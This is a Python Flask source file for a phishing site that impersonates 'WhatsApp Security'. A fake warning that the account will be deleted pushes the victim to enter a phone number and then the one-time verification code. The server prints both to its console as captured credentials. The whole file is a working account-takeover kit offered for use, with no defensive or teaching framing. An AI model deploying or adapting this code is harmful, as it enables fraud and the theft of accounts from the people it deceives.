from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return """
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5;">
    <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; width: 90%; max-width: 400px;">
    <h2 style="color: #25D366;">WhatsApp Security</h2>
    <p style="color: red; font-size: 14px;">Your account will be deleted. Verify your number.</p>
    <form action='/capture' method='POST'>
    <input type="text" name="phone" placeholder="Phone Number" required style="width: 100%; padding: 12px; margin: 10px 0;">
    <button type="submit" style="width: 100%; padding: 12px; background: #25D366; color: white;">Next</button>
    </form></div></body></html>
    """

@app.route('/capture', methods=['POST'])
def capture():
    phone = request.form.get('phone')
    print(f"\n[!!!] PHONE CAPTURED: {phone}\n", flush=True)
    return redirect('/otp')

@app.route('/otp', methods=['GET'])
def otp_page():
    return """
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5;">
    <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; width: 90%; max-width: 400px;">
    <h2 style="color: #25D366;">Enter OTP</h2>
    <form action='/success' method='POST'>
    <input type="text" name="otp" placeholder="123456" required style="width: 100%; padding: 12px; margin: 10px 0; text-align: center; letter-spacing: 5px;">
    <button type="submit" style="width: 100%; padding: 12px; background: #25D366; color: white;">Verify</button>
    </form></div></body></html>
    """

@app.route('/success', methods=['POST'])
def success():
    otp = request.form.get('otp')
    print(f"[!!!] OTP CAPTURED: {otp}\n", flush=True)
    return "<h1 style='text-align:center;margin-top:50px;'>Verified Successfully!</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)